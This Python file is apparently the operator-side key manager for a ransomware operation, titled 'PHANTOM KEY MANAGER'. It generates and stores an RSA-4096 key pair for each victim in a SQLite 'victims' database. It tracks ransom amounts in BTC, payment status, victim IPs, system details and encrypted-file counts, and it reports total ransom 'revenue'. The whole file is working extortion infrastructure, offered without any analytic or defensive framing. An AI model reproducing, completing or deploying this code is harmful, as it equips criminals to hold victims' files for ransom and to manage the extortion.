
import sqlite3
import hashlib
import time
import os
import sys
import platform
import uuid
import secrets
from datetime import datetime

# Crypto library selection
try:
    from Cryptodome.PublicKey import RSA
    CRYPTO_LIB = "cryptodome"
except ImportError:
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.backends import default_backend
        CRYPTO_LIB = "cryptography"
    except ImportError:
        print("[ERROR] Install: pip install pycryptodome")
        sys.exit(1)

DB_FILE = "victims.db"
KEY_SIZE = 4096
EXPORT_DIR = "exported_keys"

def init_database():
    """Initialize SQLite database for victims"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            victim_id TEXT PRIMARY KEY,
            public_key TEXT NOT NULL,
            private_key TEXT NOT NULL,
            payment_status TEXT DEFAULT 'pending',
            ransom_amount REAL DEFAULT 0.5,
            payment_address TEXT DEFAULT '',
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP,
            files_encrypted INTEGER DEFAULT 0,
            system_info TEXT,
            ip_address TEXT,
            notes TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS activity_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            activity TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
    print(f"[+] Database initialized: {DB_FILE}")

def generate_rsa_keys():
    """Generate RSA key pair (4096-bit)"""
    try:
        if CRYPTO_LIB == "cryptodome":
            key = RSA.generate(KEY_SIZE)
            private_key = key.export_key().decode('utf-8')
            public_key = key.publickey().export_key().decode('utf-8')
        else:
            private_key_obj = rsa.generate_private_key(
                public_exponent=65537,
                key_size=KEY_SIZE,
                backend=default_backend()
            )
            public_key_obj = private_key_obj.public_key()
            
            private_key = private_key_obj.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ).decode('utf-8')
            
            public_key = public_key_obj.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode('utf-8')
        
        return public_key, private_key
    except Exception as e:
        print(f"[ERROR] Key generation failed: {e}")
        return None, None

def generate_victim_id(ip="0.0.0.0", system_info=""):
    """Generate unique victim ID"""
    unique_data = f"{ip}_{time.time()}_{secrets.randbelow(1000000)}_{platform.node()}"
    victim_hash = hashlib.sha256(unique_data.encode()).hexdigest()[:24]
    return f"{victim_hash[:8]}-{victim_hash[8:12]}-{victim_hash[12:16]}-{victim_hash[16:20]}-{victim_hash[20:24]}"

def create_victim(system_info="", ip="0.0.0.0"):
    """Create new victim entry with RSA keys"""
    victim_id = generate_victim_id(ip, system_info)
    print(f"[*] Creating victim: {victim_id}")
    
    public_key, private_key = generate_rsa_keys()
    if not public_key or not private_key:
        return None
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO victims (victim_id, public_key, private_key, system_info, ip_address)
        VALUES (?, ?, ?, ?, ?)
    ''', (victim_id, public_key, private_key, system_info, ip))
    
    cursor.execute('''
        INSERT INTO activity_log (victim_id, activity)
        VALUES (?, ?)
    ''', (victim_id, "VICTIM_CREATED"))
    
    conn.commit()
    conn.close()
    
    print(f"[+] Victim created: {victim_id}")
    print(f"    Public Key:  {public_key[:64]}...")
    print(f"    Private Key: {private_key[:64]}...")
    
    return victim_id

def get_victim(victim_id):
    """Retrieve victim data from database"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,))
    victim = cursor.fetchone()
    conn.close()
    return victim

def list_victims():
    """List all victims in database"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT victim_id, payment_status, first_seen, files_encrypted, system_info
        FROM victims
        ORDER BY first_seen DESC
    ''')
    victims = cursor.fetchall()
    conn.close()
    return victims

def update_status(victim_id, status, notes=""):
    """Update victim payment status"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        UPDATE victims
        SET payment_status = ?, last_seen = CURRENT_TIMESTAMP, notes = ?
        WHERE victim_id = ?
    ''', (status, notes, victim_id))
    
    cursor.execute('''
        INSERT INTO activity_log (victim_id, activity)
        VALUES (?, ?)
    ''', (victim_id, f"STATUS_UPDATED:{status}"))
    
    conn.commit()
    affected = cursor.rowcount
    conn.close()
    
    if affected > 0:
        print(f"[+] Status updated for {victim_id}: {status}")
        return True
    return False

def mark_paid(victim_id, btc_address=""):
    """Mark victim as paid and optionally set BTC address"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    if btc_address:
        cursor.execute('''
            UPDATE victims
            SET payment_status = 'paid', payment_address = ?, last_seen = CURRENT_TIMESTAMP
            WHERE victim_id = ?
        ''', (btc_address, victim_id))
    else:
        cursor.execute('''
            UPDATE victims
            SET payment_status = 'paid', last_seen = CURRENT_TIMESTAMP
            WHERE victim_id = ?
        ''', (victim_id,))
    
    cursor.execute('''
        INSERT INTO activity_log (victim_id, activity)
        VALUES (?, ?)
    ''', (victim_id, "PAYMENT_RECEIVED"))
    
    conn.commit()
    affected = cursor.rowcount
    conn.close()
    
    if affected > 0:
        print(f"[+] Marked as paid: {victim_id}")
        return True
    return False

def export_keys(victim_id, output_dir=EXPORT_DIR):
    """Export victim keys to PEM files"""
    victim = get_victim(victim_id)
    if not victim:
        print(f"[ERROR] Victim not found: {victim_id}")
        return False
    
    os.makedirs(output_dir, exist_ok=True)
    
    # Export public key
    pub_file = f"{output_dir}/{victim_id}_public.pem"
    with open(pub_file, 'w') as f:
        f.write(victim[1])
    
    # Export private key
    priv_file = f"{output_dir}/{victim_id}_private.pem"
    with open(priv_file, 'w') as f:
        f.write(victim[2])
    
    # Export info file
    info_file = f"{output_dir}/{victim_id}_info.txt"
    with open(info_file, 'w') as f:
        f.write(f"Victim ID: {victim[0]}\n")
        f.write(f"Status: {victim[3]}\n")
        f.write(f"First Seen: {victim[6]}\n")
        f.write(f"Files Encrypted: {victim[8]}\n")
        f.write(f"System: {victim[9] or 'Unknown'}\n")
        f.write(f"IP: {victim[10] or 'Unknown'}\n")
    
    print(f"[+] Keys exported to {output_dir}/")
    print(f"    Public:  {pub_file}")
    print(f"    Private: {priv_file}")
    print(f"    Info:    {info_file}")
    
    return True

def delete_victim(victim_id):
    """Delete victim from database"""
    confirm = input(f"Delete victim {victim_id}? (yes/no): ")
    if confirm.lower() != "yes":
        return False
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('DELETE FROM activity_log WHERE victim_id = ?', (victim_id,))
    cursor.execute('DELETE FROM victims WHERE victim_id = ?', (victim_id,))
    
    conn.commit()
    affected = cursor.rowcount
    conn.close()
    
    if affected > 0:
        print(f"[+] Deleted victim: {victim_id}")
        return True
    
    print(f"[ERROR] Victim not found: {victim_id}")
    return False

def get_statistics():
    """Get ransomware statistics"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM victims')
    total = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM victims WHERE payment_status = "paid"')
    paid = cursor.fetchone()[0]
    
    cursor.execute('SELECT SUM(files_encrypted) FROM victims')
    files = cursor.fetchone()[0] or 0
    
    cursor.execute('SELECT SUM(ransom_amount) FROM victims WHERE payment_status = "paid"')
    revenue = cursor.fetchone()[0] or 0
    
    conn.close()
    
    return {
        'total_victims': total,
        'paid_victims': paid,
        'total_files': files,
        'total_revenue': revenue
    }

def display_victim_details(victim_id):
    """Display detailed victim information"""
    victim = get_victim(victim_id)
    if not victim:
        print(f"[ERROR] Victim not found: {victim_id}")
        return
    
    print("\n" + "="*60)
    print("VICTIM DETAILS")
    print("="*60)
    print(f"ID:              {victim[0]}")
    print(f"Status:          {victim[3]}")
    print(f"Ransom:          {victim[4]} BTC")
    print(f"BTC Address:     {victim[5]}")
    print(f"First Seen:      {victim[6]}")
    print(f"Last Seen:       {victim[7] or 'Never'}")
    print(f"Files Encrypted: {victim[8]}")
    print(f"System Info:     {victim[9] or 'Unknown'}")
    print(f"IP Address:      {victim[10] or 'Unknown'}")
    print(f"Notes:           {victim[11] or 'None'}")
    print("\nPublic Key (first 80 chars):")
    print(f"{victim[1][:80]}...")
    print("\nPrivate Key (first 80 chars):")
    print(f"{victim[2][:80]}...")
    print("="*60)

def interactive_menu():
    """Interactive command-line interface"""
    print("\n" + "="*60)
    print("PHANTOM KEY MANAGER")
    print("="*60)
    
    init_database()
    
    while True:
        print("\nCommands: new, list, show <id>, export <id>, pay <id> [btc],")
        print("         status <id> <status>, delete <id>, stats, exit")
        
        try:
            cmd = input("\nkeymgr> ").strip()
            if not cmd:
                continue
            
            parts = cmd.split()
            action = parts[0].lower()
            
            if action == "exit":
                print("[*] Exiting")
                break
            
            elif action == "new":
                sys_info = " ".join(parts[1:]) if len(parts) > 1 else "Unknown"
                create_victim(sys_info)
            
            elif action == "list":
                victims = list_victims()
                if not victims:
                    print("[*] No victims in database")
                else:
                    print("\n" + "-"*80)
                    print(f"{'ID':<30} {'Status':<10} {'First Seen':<20} {'Files':<6}")
                    print("-"*80)
                    for v in victims:
                        print(f"{v[0]:<30} {v[1]:<10} {v[2]:<20} {v[3]:<6}")
            
            elif action == "show" and len(parts) >= 2:
                display_victim_details(parts[1])
            
            elif action == "export" and len(parts) >= 2:
                export_keys(parts[1])
            
            elif action == "pay" and len(parts) >= 2:
                btc_addr = parts[2] if len(parts) >= 3 else ""
                mark_paid(parts[1], btc_addr)
            
            elif action == "status" and len(parts) >= 3:
                status = parts[2]
                notes = " ".join(parts[3:]) if len(parts) >= 4 else ""
                update_status(parts[1], status, notes)
            
            elif action == "delete" and len(parts) >= 2:
                delete_victim(parts[1])
            
            elif action == "stats":
                stats = get_statistics()
                print(f"\nTotal Victims:    {stats['total_victims']}")
                print(f"Paid Victims:     {stats['paid_victims']}")
                print(f"Files Encrypted:  {stats['total_files']}")
                print(f"Total Revenue:    {stats['total_revenue']} BTC")
            
            else:
                print("[ERROR] Invalid command. Type 'help' for options.")
        
        except KeyboardInterrupt:
            print("\n[*] Interrupted")
            break
        except Exception as e:
            print(f"[ERROR] {e}")

if __name__ == "__main__":
    interactive_menu()